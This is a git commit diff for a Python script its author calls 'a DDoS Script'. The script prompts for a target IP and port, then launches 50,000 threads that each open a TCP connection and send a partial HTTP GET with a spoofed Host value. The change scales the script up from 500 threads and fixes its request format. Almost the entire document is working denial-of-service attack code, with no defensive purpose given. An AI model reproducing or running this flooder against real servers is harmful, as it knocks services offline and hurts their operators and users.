9ef592fb8a184f0515fa34318110170782c9ddd9
Pooja Nokhwal <poojanokhwal04@gmail.com>
2025-05-08 13:29:22 -0400

    This is a DDoS Script

--- DDoSUsingPython/ddos.py
+++ DDoSUsingPython/ddos.py
@@ -5,12 +5,25 @@ target=input('Enter the Target IP: ')
 port=int(input('Enter the Target Port: '))
 fake_ip=input('Enter a Fake IP: ')
 
-def attack():
-    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((target,port))
-    s.sendto(('GET/'+target+'HTTP/1.1\r\n').encode('ascii'), (target,port))
-    s.sendto(('HOST: ' + fake_ip + '\r\n\r\n').encode('ascii'), (target, port))
+attack_connection = 0
 
-for i in range(500):
+def attack():
+    global attack_connection
+    try:
+         s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         s.connect((target,port))
+         s.sendall(b"GET / HTTP/1.1\r\n")
+         s.sendall(f"Host: {fake_ip}\r\n".encode('ascii'))
+         s.close()
+
+         attack_connection+=1
+         if attack_connection%500==0:
+                 print('Connection made: ', attack_connection)
+
+    except:
+        pass
+
+for i in range(50000):
     thread=threading.Thread(target=attack)
     thread.start()
+
